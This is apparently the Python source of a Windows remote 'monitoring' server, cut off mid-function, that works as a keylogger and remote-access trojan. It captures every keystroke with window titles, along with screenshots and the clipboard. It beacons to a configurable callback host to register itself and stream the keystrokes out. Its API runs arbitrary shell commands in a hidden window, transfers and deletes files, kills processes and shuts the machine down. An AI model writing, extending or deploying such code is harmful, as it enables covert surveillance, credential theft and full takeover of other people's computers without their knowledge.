import json
import os
import base64
import secrets
import win32clipboard
import uuid
from datetime import datetime, timedelta
from pathlib import Path
from threading import Thread, Lock
import threading
import time
import queue
import subprocess
import sys
import signal
import socket

from flask import Flask, request, jsonify
from flask_cors import CORS
from pynput import mouse, keyboard
from PIL import ImageGrab
import requests

try:
    import win32gui
    import win32process
    import psutil
    WINDOWS_SUPPORT = True
except ImportError:
    WINDOWS_SUPPORT = False
    print("Warning: Windows-specific features disabled (win32gui/psutil not available)")

app = Flask(__name__)
CORS(app)

# Configuration
CONFIG_FILE = "config.json"
DATA_DIR = Path("monitor_data")
SCREENSHOTS_DIR = DATA_DIR / "screenshots"
OFFLINE_LOGS_DIR = DATA_DIR / "offline_logs"

# Ensure directories exist
DATA_DIR.mkdir(exist_ok=True)
SCREENSHOTS_DIR.mkdir(exist_ok=True)
OFFLINE_LOGS_DIR.mkdir(exist_ok=True)

# Global state - Initialize with None
monitoring = False
events = []
events_lock = Lock()
keystroke_buffer = []
keystroke_lock = Lock()
live_keystroke_queue = queue.Queue(maxsize=1000)
last_screenshot_time = None
auto_screenshot_enabled = False
auto_screenshot_interval = 300  # 5 minutes default
screenshot_history = []
offline_mode = False
offline_buffer = []

# Motion detection
last_mouse_pos = None
last_activity_time = datetime.now()

# Multi-PC support - Will be set after loading config
pc_id = None
API_KEY = None
config = None

# ============================================================================
# REVERSE CONNECTION MODULE
# ============================================================================

class ReverseConnection:
    """Enhanced reverse connection - server auto-registers with client"""
    
    def __init__(self, config):
        self.callback_url = config.get('callback_url')
        self.callback_key = config.get('callback_key')
        self.interval = config.get('interval', 15)  # Send updates every 15s
        self.heartbeat_interval = config.get('heartbeat_interval', 5)  # Check connection every 5s
        self.retry_interval = config.get('retry_interval', 10)  # Retry connection every 10s
        self.enabled = config.get('enabled', False)
        self.running = True
        self.connected = False
        self.registered = False
        self.last_heartbeat = None
        
    def start(self):
        """Start the reverse connection thread"""
        if not self.enabled:
            print("Reverse connection disabled")
            return
        
        # Start main callback loop
        thread = threading.Thread(target=self._callback_loop, daemon=True)
        thread.start()
        
        # Start heartbeat loop
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        print(f" Reverse connection enabled - will connect to {self.callback_url}")
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats to maintain connection"""
        while self.running:
            if self.connected:
                try:
                    response = requests.post(
                        f"{self.callback_url}/heartbeat",
                        json={
                            "pc_id": pc_id,
                            "pc_name": config.get('pc_name', 'Unknown'),
                            "timestamp": datetime.now().isoformat()
                        },
                        headers={'X-Callback-Key': self.callback_key},
                        timeout=3
                    )
                    
                    if response.status_code == 200:
                        self.last_heartbeat = datetime.now()
                    else:
                        # Connection lost
                        self.connected = False
                        self.registered = False
                        print(f" Lost connection to client (heartbeat failed)")
                        
                except Exception as e:
                    self.connected = False
                    self.registered = False
                    
            time.sleep(self.heartbeat_interval)
    
    def _callback_loop(self):
        """Main loop that sends data back to client"""
        while self.running:
            try:
                # If not connected, try to register
                if not self.connected:
                    if self._register_with_client():
                        self.connected = True
                        self.registered = True
                        print(f" Registered with client at {self.callback_url}")
                    else:
                        time.sleep(self.retry_interval)
                        continue
                
                # Send data update
                data = self._collect_data()
                
                response = requests.post(
                    f"{self.callback_url}/callback",
                    json=data,
                    headers={'X-Callback-Key': self.callback_key},
                    timeout=5
                )
                
                if response.status_code == 200:
                    # Check if client sent commands
                    result = response.json()
                    if result.get('commands'):
                        for command in result['commands']:
                            self._handle_command(command)
                    
                    time.sleep(self.interval)
                else:
                    raise Exception(f"Bad response: {response.status_code}")
                    
            except Exception as e:
                if self.connected:
                    print(f" Lost connection to client: {e}")
                    self.connected = False
                    self.registered = False
                
                time.sleep(self.retry_interval)
    
    def _register_with_client(self):
        """Register this server with the client"""
        try:
            # Get local IP
            local_ip = get_local_ip()
            
            registration_data = {
                "type": "register",
                "pc_id": pc_id,
                "pc_name": config.get('pc_name', 'Unknown'),
                "server_url": f"http://{local_ip}:{config['port']}",
                "api_key": API_KEY,
                "timestamp": datetime.now().isoformat(),
                "capabilities": {
                    "monitoring": True,
                    "screenshots": True,
                    "keylogging": True,
                    "remote_commands": True,
                    "process_management": WINDOWS_SUPPORT,
                    "filesystem": True,
                    "clipboard": WINDOWS_SUPPORT
                }
            }
            
            response = requests.post(
                f"{self.callback_url}/register",
                json=registration_data,
                headers={'X-Callback-Key': self.callback_key},
                timeout=5
            )
            
            if response.status_code == 200:
                return True
            else:
                print(f"Registration failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"Registration error: {e}")
            return False
    
    def _collect_data(self):
        """Collect data to send to client"""
        global events, keystroke_buffer, monitoring, pc_id, config
        
        current_config = config if config is not None else {}
        
        # Get recent events (last 50)
        with events_lock:
            recent_events = events[-50:] if len(events) > 0 else []
        
        # Get recent keystrokes
        with keystroke_lock:
            recent_keystrokes = keystroke_buffer[-100:] if len(keystroke_buffer) > 0 else []
        
        # Get latest screenshot info (not the image data)
        latest_screenshot = None
        if screenshot_history:
            latest_screenshot = {
                "filename": screenshot_history[-1]['filename'],
                "timestamp": screenshot_history[-1]['timestamp']
            }
        
        return {
            "type": "update",
            "timestamp": datetime.now().isoformat(),
            "pc_id": pc_id,
            "pc_name": current_config.get('pc_name', 'Unknown'),
            "monitoring": monitoring,
            "event_count": len(events),
            "keystroke_count": len(keystroke_buffer),
            "screenshot_count": len(screenshot_history),
            "latest_screenshot": latest_screenshot,
            "events": recent_events,
            "keystrokes": recent_keystrokes
        }
    
    def _handle_command(self, command):
        """Handle commands from client"""
        cmd_type = command.get('type')
        
        print(f"â†' Received command: {cmd_type}")
        
        if cmd_type == 'start':
            start_monitoring()
        elif cmd_type == 'stop':
            stop_monitoring()
        elif cmd_type == 'snapshot':
            take_screenshot()
        elif cmd_type == 'ping':
            pass  # Just acknowledge
    
    def stop(self):
        """Stop the reverse connection"""
        self.running = False


def load_callback_config():
    """Load callback configuration with better defaults"""
    callback_file = Path("callback_config.json")
    
    if callback_file.exists():
        try:
            with open(callback_file, 'r') as f:
                return json.load(f)
        except:
            pass
    
    # Create default config - DISABLED by default, user must configure
    default_config = {
        "enabled": False,
        "callback_url": "http://YOUR_CLIENT_IP:8080",
        "callback_key": "COPY_FROM_CLIENT",
        "interval": 15,
        "heartbeat_interval": 5,
        "retry_interval": 10
    }
    
    with open(callback_file, 'w') as f:
        json.dump(default_config, f, indent=4)
    
    print(f"\nâ„¹ï¸  Created callback_config.json")
    print("   To enable reverse connection:")
    print("   1. Start the client/manager")
    print("   2. Copy the callback key from client")
    print("   3. Edit callback_config.json:")
    print("      - Set 'enabled': true")
    print("      - Set 'callback_url' to your client IP")
    print("      - Set 'callback_key' from client")
    print("   4. Restart this server")
    
    return default_config

# ============================================================================
# CORE FUNCTIONALITY
# ============================================================================

def load_config():
    """Load configuration from file"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    
    # Generate default config
    config = {
        "api_key": secrets.token_urlsafe(32),
        "port": 5000,
        "host": "0.0.0.0",
        "auto_screenshot": False,
        "screenshot_interval": 300,
        "motion_detection": False,
        "data_retention_days": 30,
        "pc_id": secrets.token_hex(8),
        "pc_name": os.environ.get('COMPUTERNAME', 'Unknown-PC')
    }
    
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    
    print(f"\n{'='*70}")
    print("FIRST TIME SETUP - Configuration Created")
    print(f"{'='*70}")
    print(f"API Key: {config['api_key']}")
    print(f"Port: {config['port']}")
    print(f"\nSave this API key - you'll need it in the client!")
    print(f"{'='*70}\n")
    
    return config

# Load configuration and set globals
config = load_config()
API_KEY = config['api_key']
pc_id = config['pc_id']

# Authentication decorator
def require_auth(f):
    def decorated(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if api_key != API_KEY:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# Event logging
def log_event(event_type, details=None):
    """Log an event with timestamp"""
    global offline_mode, offline_buffer
    
    event = {
        "timestamp": datetime.now().isoformat(),
        "type": event_type,
        "details": details or {},
        "pc_id": pc_id
    }
    
    with events_lock:
        events.append(event)
        
        # Limit memory usage
        if len(events) > 10000:
            events.pop(0)
    
    # Handle offline mode
    if offline_mode:
        offline_buffer.append(event)
        save_offline_log(event)
    
    return event

def save_offline_log(event):
    """Save event to offline log file"""
    try:
        date_str = datetime.now().strftime("%Y-%m-%d")
        log_file = OFFLINE_LOGS_DIR / f"offline_{date_str}.jsonl"
        
        with open(log_file, 'a') as f:
            f.write(json.dumps(event) + '\n')
    except Exception as e:
        print(f"Error saving offline log: {e}")

def sync_offline_logs():
    """Sync offline logs when connection restored"""
    global offline_buffer
    
    if offline_buffer:
        print(f"Syncing {len(offline_buffer)} offline events...")
        with events_lock:
            events.extend(offline_buffer)
        offline_buffer = []

# Keystroke buffering and live streaming
def process_keystroke(key):
    """Process keystroke for both logging and live streaming"""
    try:
        char = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        char = str(key)
    
    timestamp = datetime.now().isoformat()
    window = get_active_window_title()
    
    # Add to keystroke buffer
    with keystroke_lock:
        keystroke_buffer.append({
            "timestamp": timestamp,
            "key": char,
            "window": window
        })
        
        # Limit buffer size
        if len(keystroke_buffer) > 5000:
            keystroke_buffer.pop(0)
    
    # Add to live queue (non-blocking)
    try:
        live_keystroke_queue.put_nowait({
            "timestamp": timestamp,
            "key": char,
            "window": window
        })
    except queue.Full:
        # Drop oldest item and add new one
        try:
            live_keystroke_queue.get_nowait()
            live_keystroke_queue.put_nowait({
                "timestamp": timestamp,
                "key": char,
                "window": window
            })
        except:
            pass

def format_keystrokes_to_text(keystrokes):
    """Convert raw keystrokes to readable text"""
    text = ""
    for ks in keystrokes:
        key = ks['key']
        
        # Filter special keys
        if key.startswith('Key.'):
            key_name = key.replace('Key.', '')
            if key_name == 'space':
                text += ' '
            elif key_name == 'enter':
                text += '\n'
            elif key_name == 'backspace':
                text = text[:-1] if text else text
            elif key_name == 'tab':
                text += '\t'
            # Ignore other special keys
        else:
            text += key
    
    return text

# Window tracking
current_window = None

def get_active_window_title():
    """Get the title of the currently active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown"
    
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown"

def get_active_window_process():
    """Get process name of active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown"
    
    try:
        window = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return process.name()
    except:
        return "Unknown"

# Mouse listener
def on_click(x, y, button, pressed):
    global last_mouse_pos, last_activity_time
    
    if pressed and monitoring:
        last_mouse_pos = (x, y)
        last_activity_time = datetime.now()
        
        log_event("mouse_click", {
            "x": x,
            "y": y,
            "button": str(button),
            "window": get_active_window_title()
        })

def on_move(x, y):
    global last_mouse_pos, last_activity_time
    
    if monitoring:
        # Only update if significant movement (reduces spam)
        if last_mouse_pos is None or \
           abs(x - last_mouse_pos[0]) > 50 or abs(y - last_mouse_pos[1]) > 50:
            last_mouse_pos = (x, y)
            last_activity_time = datetime.now()

# Keyboard listener
def on_press(key):
    if monitoring:
        process_keystroke(key)
        
        # Only log special keys in events
        if not hasattr(key, 'char'):
            log_event("key_press", {
                "key": str(key),
                "window": get_active_window_title(),
                "process": get_active_window_process()
            })

# Window change monitor
def monitor_window_changes():
    """Monitor active window changes"""
    global current_window
    
    while monitoring:
        try:
            window = get_active_window_title()
            if window != current_window and window != "Unknown":
                current_window = window
                log_event("window_change", {
                    "title": window,
                    "process": get_active_window_process()
                })
        except:
            pass
        time.sleep(1)

# Screenshot management
def take_screenshot():
    """Capture and save screenshot"""
    try:
        screenshot = ImageGrab.grab()
        
        # Generate filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = SCREENSHOTS_DIR / filename
        
        screenshot.save(filepath, "PNG")
        
        # Add to history
        screenshot_history.append({
            "filename": filename,
            "timestamp": datetime.now().isoformat(),
            "path": str(filepath)
        })
        
        # Limit history
        if len(screenshot_history) > 100:
            old = screenshot_history.pop(0)
            # Delete old file
            try:
                os.remove(old['path'])
            except:
                pass
        
        log_event("screenshot", {"filename": filename})
        
        return filepath
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

def auto_screenshot_thread():
    """Background thread for automatic screenshots"""
    global last_screenshot_time, last_activity_time, config
    
    while True:
        time.sleep(10)  # Check every 10 seconds
        
        if not monitoring or not auto_screenshot_enabled or config is None:
            continue
        
        now = datetime.now()
        
        # Check if it's time for a screenshot
        if last_screenshot_time is None or \
           (now - last_screenshot_time).total_seconds() >= auto_screenshot_interval:
            
            # Motion detection check
            if config.get('motion_detection', False):
                # Only screenshot if there was recent activity
                if (now - last_activity_time).total_seconds() > 60:
                    continue  # No recent activity, skip screenshot
            
            take_screenshot()
            last_screenshot_time = now

# Data cleanup
def cleanup_old_data():
    """Remove old data based on retention policy"""
    if config is None:
        retention_days = 30  # default if config not available
    else:
        retention_days = config.get('data_retention_days', 30)
    cutoff_date = datetime.now() - timedelta(days=retention_days)
    
    # Clean screenshots
    for img_file in SCREENSHOTS_DIR.glob("*.png"):
        try:
            file_time = datetime.fromtimestamp(img_file.stat().st_mtime)
            if file_time < cutoff_date:
                img_file.unlink()
        except:
            pass
    
    # Clean offline logs
    for log_file in OFFLINE_LOGS_DIR.glob("*.jsonl"):
        try:
            file_time = datetime.fromtimestamp(log_file.stat().st_mtime)
            if file_time < cutoff_date:
                log_file.unlink()
        except:
            pass

# Start monitoring threads
mouse_listener = None
keyboard_listener = None
window_thread = None

def start_monitoring():
    """Start all monitoring threads"""
    global monitoring, mouse_listener, keyboard_listener, window_thread
    global last_screenshot_time
    
    if monitoring:
        return {"status": "already_running"}
    
    monitoring = True
    last_screenshot_time = None
    
    # Start mouse listener
    mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)
    mouse_listener.start()
    
    # Start keyboard listener
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    
    # Start window monitor
    window_thread = Thread(target=monitor_window_changes, daemon=True)
    window_thread.start()
    
    log_event("monitoring_started")
    
    return {"status": "started", "pc_id": pc_id}

def stop_monitoring():
    """Stop all monitoring"""
    global monitoring, mouse_listener, keyboard_listener
    
    if not monitoring:
        return {"status": "already_stopped"}
    
    monitoring = False
    
    if mouse_listener:
        mouse_listener.stop()
    if keyboard_listener:
        keyboard_listener.stop()
    
    log_event("monitoring_stopped")
    
    return {"status": "stopped", "pc_id": pc_id}


# Get ipv4
def get_local_ip():
    """Get the local IPv4 address"""
    try:
        # Method 1: Connect to external address (doesn't actually send data)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        pass
    
    try:
        # Method 2: Get hostname and resolve it
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        if local_ip.startswith('127.'):
            raise Exception("Got loopback")
        return local_ip
    except:
        pass
    
    try:
        # Method 3: Enumerate network interfaces (Windows)
        import subprocess
        result = subprocess.run(['ipconfig'], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        
        for i, line in enumerate(lines):
            if 'IPv4 Address' in line or 'IPv4' in line:
                if ':' in line:
                    ip = line.split(':')[-1].strip()
                    ip = ip.replace('(Preferred)', '').strip()
                    if not ip.startswith('127.') and not ip.startswith('169.254.'):
                        return ip
    except:
        pass
    
    return "0.0.0.0"


def get_all_local_ips():
    """Get all local IP addresses"""
    ips = []
    
    try:
        import subprocess
        result = subprocess.run(['ipconfig'], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        
        for line in lines:
            if 'IPv4 Address' in line or 'IPv4' in line:
                if ':' in line:
                    ip = line.split(':')[-1].strip()
                    ip = ip.replace('(Preferred)', '').strip()
                    if not ip.startswith('127.') and not ip.startswith('169.254.'):
                        if ip not in ips:
                            ips.append(ip)
    except:
        pass
    
    return ips

# ============================================================================
# API ENDPOINTS
# ============================================================================

@app.route('/api/status', methods=['GET'])
def status():
    """Get current monitoring status"""
    pc_name = config.get('pc_name', 'Unknown') if config is not None else 'Unknown'
    return jsonify({
        "monitoring": monitoring,
        "event_count": len(events),
        "keystroke_count": len(keystroke_buffer),
        "screenshot_count": len(screenshot_history),
        "pc_id": pc_id,
        "pc_name": pc_name,
        "auto_screenshot": auto_screenshot_enabled,
        "offline_mode": offline_mode
    })

@app.route('/api/start', methods=['POST'])
@require_auth
def start():
    """Start monitoring"""
    result = start_monitoring()
    return jsonify(result)

@app.route('/api/stop', methods=['POST'])
@require_auth
def stop():
    """Stop monitoring"""
    result = stop_monitoring()
    return jsonify(result)

@app.route('/api/kill', methods=['POST'])
@require_auth
def kill_server():
    """Kill the server process"""
    log_event("server_killed", {"source": "remote_client"})
    
    # Stop monitoring first
    stop_monitoring()
    
    # Return response before killing
    response = jsonify({"status": "server_killed", "message": "Server shutting down..."})
    
    # Schedule shutdown after response is sent
    def shutdown():
        time.sleep(1)
        print("\n[!] Server killed by remote client")
        os.kill(os.getpid(), signal.SIGTERM)
    
    Thread(target=shutdown, daemon=True).start()
    
    return response

@app.route('/api/events', methods=['GET'])
@require_auth
def get_events():
    """Get logged events"""
    limit = int(request.args.get('limit', 100))
    event_type = request.args.get('type', None)
    search = request.args.get('search', None)
    start_date = request.args.get('start_date', None)
    end_date = request.args.get('end_date', None)
    
    with events_lock:
        filtered = events.copy()
    
    # Apply filters
    if event_type:
        filtered = [e for e in filtered if e['type'] == event_type]
    
    if search:
        search_lower = search.lower()
        filtered = [e for e in filtered if 
                   search_lower in str(e.get('details', {})).lower() or
                   search_lower in e['type'].lower()]
    
    if start_date:
        try:
            start_dt = datetime.fromisoformat(start_date)
            filtered = [e for e in filtered if datetime.fromisoformat(e['timestamp']) >= start_dt]
        except:
            pass
    
    if end_date:
        try:
            end_dt = datetime.fromisoformat(end_date)
            filtered = [e for e in filtered if datetime.fromisoformat(e['timestamp']) <= end_dt]
        except:
            pass
    
    return jsonify(filtered[-limit:])

@app.route('/api/keystrokes/live', methods=['GET'])
@require_auth
def get_live_keystrokes():
    """Get live keystroke stream (non-blocking)"""
    keystrokes = []
    
    try:
        while not live_keystroke_queue.empty():
            keystrokes.append(live_keystroke_queue.get_nowait())
            if len(keystrokes) >= 50:  # Limit batch size
                break
    except queue.Empty:
        pass
    
    return jsonify({
        "keystrokes": keystrokes,
        "text": format_keystrokes_to_text(keystrokes)
    })

@app.route('/api/keystrokes/buffer', methods=['GET'])
@require_auth
def get_keystroke_buffer():
    """Get buffered keystrokes"""
    limit = int(request.args.get('limit', 1000))
    format_as_text = request.args.get('format', 'json') == 'text'
    
    with keystroke_lock:
        buffer = keystroke_buffer[-limit:]
    
    if format_as_text:
        return jsonify({
            "text": format_keystrokes_to_text(buffer),
            "count": len(buffer)
        })
    else:
        return jsonify(buffer)

@app.route('/api/snapshot', methods=['POST'])
@require_auth
def snapshot():
    """Take an immediate screenshot"""
    filepath = take_screenshot()
    if filepath:
        return jsonify({"status": "success", "filename": filepath.name})
    return jsonify({"error": "Failed to capture screenshot"}), 500

@app.route('/api/screenshot/latest', methods=['GET'])
@require_auth
def get_latest_screenshot():
    """Get the most recent screenshot"""
    if not screenshot_history:
        return jsonify({"error": "No screenshots available"}), 404
    
    latest = screenshot_history[-1]
    
    try:
        with open(latest['path'], 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({
            "image": image_data,
            "timestamp": latest['timestamp'],
            "filename": latest['filename']
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot/history', methods=['GET'])
@require_auth
def get_screenshot_history():
    """Get screenshot history list"""
    return jsonify(screenshot_history)

@app.route('/api/screenshot/<filename>', methods=['GET'])
@require_auth
def get_screenshot(filename):
    """Get specific screenshot by filename"""
    filepath = SCREENSHOTS_DIR / filename
    
    if not filepath.exists():
        return jsonify({"error": "Screenshot not found"}), 404
    
    try:
        with open(filepath, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({"image": image_data, "filename": filename})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/settings/screenshot', methods=['POST'])
@require_auth
def update_screenshot_settings():
    """Update automatic screenshot settings"""
    global auto_screenshot_enabled, auto_screenshot_interval
    
    data = request.json or {}
    
    if 'enabled' in data:
        auto_screenshot_enabled = data['enabled']
    
    if 'interval' in data:
        auto_screenshot_interval = int(data['interval'])
    
    # Update config
    global config
    if config is None:
        config = {}
    config['auto_screenshot'] = auto_screenshot_enabled
    config['screenshot_interval'] = auto_screenshot_interval
    
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    
    return jsonify({
        "enabled": auto_screenshot_enabled,
        "interval": auto_screenshot_interval
    })

@app.route('/api/command', methods=['POST'])
@require_auth
def execute_command():
    """Execute remote command"""
    data = request.json or {}
    cmd_type = data.get('type')
    
    try:
        if cmd_type == 'shutdown':
            log_event("remote_command", {"type": "shutdown"})
            subprocess.Popen(['shutdown', '/s', '/t', '10'], shell=False)
            return jsonify({"status": "success", "message": "Shutdown initiated in 10 seconds"})
        
        elif cmd_type == 'restart':
            log_event("remote_command", {"type": "restart"})
            subprocess.Popen(['shutdown', '/r', '/t', '10'], shell=False)
            return jsonify({"status": "success", "message": "Restart initiated in 10 seconds"})
        
        elif cmd_type == 'launch':
            app_path = data.get('path')
            if not app_path or not isinstance(app_path, str):
                return jsonify({"error": "Invalid application path"}), 400
            
            log_event("remote_command", {"type": "launch", "path": app_path})
            
            try:
                # Use Popen with CREATE_NEW_CONSOLE flag for GUI apps
                process = subprocess.Popen(
                    app_path,
                    shell=True,
                    creationflags=subprocess.CREATE_NEW_CONSOLE if sys.platform == 'win32' else 0
                )
                return jsonify({
                    "status": "success",
                    "message": f"Application launched",
                    "pid": process.pid
                })
            except Exception as e:
                return jsonify({"error": f"Failed to launch application: {str(e)}"}), 500
            
        elif cmd_type == 'shell':
            command = data.get('command')
            timeout = data.get('timeout', 30)
            
            if not command or not isinstance(command, str):
                return jsonify({"error": "Invalid command"}), 400
            
            # Validate timeout
            try:
                timeout = int(timeout)
                if timeout < 1 or timeout > 300:
                    timeout = 30
            except:
                timeout = 30
                
            log_event("remote_command", {"type": "shell", "command": command})
            
            try:
                # Execute the command with timeout
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
                )
                
                try:
                    stdout, stderr = process.communicate(timeout=timeout)
                    exit_code = process.returncode
                    
                    return jsonify({
                        "status": "success",
                        "exit_code": exit_code,
                        "stdout": stdout,
                        "stderr": stderr,
                        "returncode": exit_code
                    })
                    
                except subprocess.TimeoutExpired:
                    process.kill()
                    try:
                        stdout, stderr = process.communicate(timeout=2)
                    except:
                        stdout, stderr = "", ""
                    
                    return jsonify({
                        "error": f"Command timed out after {timeout} seconds",
                        "stdout": stdout,
                        "stderr": stderr
                    }), 408
                    
            except Exception as e:
                return jsonify({"error": f"Command execution failed: {str(e)}"}), 500
        
        else:
            return jsonify({"error": f"Unknown command type: {cmd_type}"}), 400
    
    except Exception as e:
        return jsonify({"error": f"Command failed: {str(e)}"}), 500

@app.route('/api/file', methods=['POST'])
@require_auth
def file_transfer():
    """Handle file transfer operations (upload/download)"""
    data = request.json or {}
    operation = data.get('operation')
    
    try:
        if operation == 'upload':
            # Client is uploading a file to the server
            remote_path = data.get('destination')
            file_content = data.get('file_content')
            
            if not remote_path or not file_content:
                return jsonify({"error": "Missing required parameters"}), 400
                
            try:
                # Ensure the directory exists
                os.makedirs(os.path.dirname(os.path.abspath(remote_path)), exist_ok=True)
                
                # Write the file
                with open(remote_path, 'wb') as f:
                    f.write(base64.b64decode(file_content))
                    
                log_event("file_transfer", {"type": "upload", "path": remote_path})
                return jsonify({"status": "success", "message": f"File uploaded to {remote_path}"})
                
            except Exception as e:
                return jsonify({"error": f"Failed to write file: {str(e)}"}), 500
                
        elif operation == 'download':
            # Client is downloading a file from the server
            remote_path = data.get('source')
            
            if not remote_path:
                return jsonify({"error": "Missing source path"}), 400
                
            try:
                # Check if file exists
                if not os.path.isfile(remote_path):
                    return jsonify({"error": "File not found"}), 404
                    
                # Read the file
                with open(remote_path, 'rb') as f:
                    file_content = base64.b64encode(f.read()).decode('utf-8')
                    
                log_event("file_transfer", {"type": "download", "path": remote_path})
                return jsonify({
                    "status": "success", 
                    "file_content": file_content,
                    "filename": os.path.basename(remote_path)
                })
                
            except Exception as e:
                return jsonify({"error": f"Failed to read file: {str(e)}"}), 500
        else:
            return jsonify({"error": f"Unknown operation: {operation}"}), 400
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/filesystem', methods=['GET', 'POST'])
@require_auth
def filesystem_operations():
    """Handle filesystem operations (list directories, get file info)"""
    try:
        if request.method == 'GET':
            # List directory contents
            path = request.args.get('path', 'C:\\')
            
            # Validate path
            if not path:
                return jsonify({'success': False, 'error': 'Path parameter required'}), 400
            
            # Normalize path
            path = os.path.normpath(path)
            
            if not os.path.exists(path):
                return jsonify({'success': False, 'error': f'Path not found: {path}'}), 404
                
            if not os.path.isdir(path):
                return jsonify({'success': False, 'error': f'Path is not a directory: {path}'}), 400
                
            items = []
            try:
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    try:
                        stat_info = os.stat(item_path)
                        item_type = 'directory' if os.path.isdir(item_path) else 'file'
                        
                        # Format size
                        size = stat_info.st_size if item_type == 'file' else 0
                        size_str = ""
                        if size < 1024:
                            size_str = f"{size} B"
                        elif size < 1024 * 1024:
                            size_str = f"{size / 1024:.1f} KB"
                        elif size < 1024 * 1024 * 1024:
                            size_str = f"{size / (1024 * 1024):.1f} MB"
                        else:
                            size_str = f"{size / (1024 * 1024 * 1024):.2f} GB"
                        
                        items.append({
                            'name': item,
                            'path': item_path,
                            'type': item_type,
                            'size': size_str,
                            'size_bytes': size,
                            'modified': datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                        })
                    except (OSError, PermissionError):
                        # Skip items that can't be accessed
                        continue
                
                # Sort: directories first, then files, alphabetically
                items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
                
            except PermissionError:
                return jsonify({'success': False, 'error': f'Permission denied accessing: {path}'}), 403
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to list directory: {str(e)}'}), 500
                    
            return jsonify({
                'success': True,
                'path': path,
                'parent': os.path.dirname(path) if path != os.path.dirname(path) else None,
                'items': items
            }), 200
            
        elif request.method == 'POST':
            # Create directory or delete files/directories
            data = request.get_json() or {}
            operation = data.get('operation')
            path = data.get('path')
            
            # Validate path is provided and is a string
            if not path or not isinstance(path, str):
                return jsonify({'success': False, 'error': 'Valid path required'}), 400
            
            # Normalize path
            path = os.path.normpath(path)
            
            if operation == 'mkdir':
                try:
                    os.makedirs(path, exist_ok=True)
                    log_event("filesystem", {"type": "mkdir", "path": path})
                    return jsonify({'success': True, 'message': f'Directory created: {path}'}), 200
                except PermissionError:
                    return jsonify({'success': False, 'error': f'Permission denied: {path}'}), 403
                except Exception as e:
                    return jsonify({'success': False, 'error': f'Failed to create directory: {str(e)}'}), 500
                    
            elif operation == 'delete':
                if not os.path.exists(path):
                    return jsonify({'success': False, 'error': f'Path not found: {path}'}), 404
                    
                try:
                    if os.path.isdir(path):
                        import shutil
                        shutil.rmtree(path)
                    else:
                        os.remove(path)
                    log_event("filesystem", {"type": "delete", "path": path})
                    return jsonify({'success': True, 'message': f'Deleted: {path}'}), 200
                except PermissionError:
                    return jsonify({'success': False, 'error': f'Permission denied: {path}'}), 403
                except Exception as e:
                    return jsonify({'success': False, 'error': f'Failed to delete: {str(e)}'}), 500
                    
            else:
                return jsonify({'success': False, 'error': f'Invalid operation: {operation}'}), 400
        
        return jsonify({'success': False, 'error': 'Method not allowed'}), 405
                
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/process', methods=['GET', 'POST'])
@require_auth
def process_management():
    """Handle process management operations"""
    try:
        if request.method == 'GET':
            # List running processes
            processes = []
            
            if not WINDOWS_SUPPORT:
                return jsonify({'success': False, 'error': 'Process management requires Windows support (psutil)'}), 400
            
            try:
                for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                    try:
                        proc_info = proc.info
                        processes.append({
                            'pid': proc_info['pid'],
                            'name': proc_info['name'] or 'Unknown',
                            'username': proc_info['username'] or 'System',
                            'memory_mb': round(proc_info['memory_info'].rss / (1024 * 1024), 2) if proc_info['memory_info'] else 0,
                            'cpu_percent': proc_info['cpu_percent'] or 0.0
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
                
                return jsonify({
                    'success': True,
                    'processes': sorted(processes, key=lambda x: x['memory_mb'], reverse=True)
                }), 200
                
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to list processes: {str(e)}'}), 500
            
        elif request.method == 'POST':
            # Process operations (kill, start)
            data = request.get_json() or {}
            operation = data.get('operation')
            
            if not WINDOWS_SUPPORT:
                return jsonify({'success': False, 'error': 'Process management requires Windows support (psutil)'}), 400
            
            if operation == 'kill':
                pid = data.get('pid')
                if not pid:
                    return jsonify({'success': False, 'error': 'PID required'}), 400
                
                try:
                    pid = int(pid)
                    process = psutil.Process(pid)
                    process_name = process.name()
                    process.terminate()
                    
